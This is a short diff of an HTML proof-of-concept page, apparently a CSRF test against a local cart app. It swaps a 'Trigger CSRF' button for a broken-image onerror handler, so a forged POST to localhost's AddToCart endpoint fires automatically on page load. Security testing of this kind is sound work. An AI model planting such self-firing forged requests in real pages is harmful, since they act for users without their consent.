@@ -7,7 +7,7 @@
 </head>
 <body>
 
-<button style="font-size: 100px;" onclick="
+    <img src="not_exist" onerror="
     fetch('https://localhost:7057/Home/AddToCart', {
         method: 'POST',
         headers: {
@@ -25,7 +25,6 @@
     .catch((error) => {
         console.error('Error:', error);
     });
-">Trigger CSRF</button>
-
+">
 </body>
 </html>
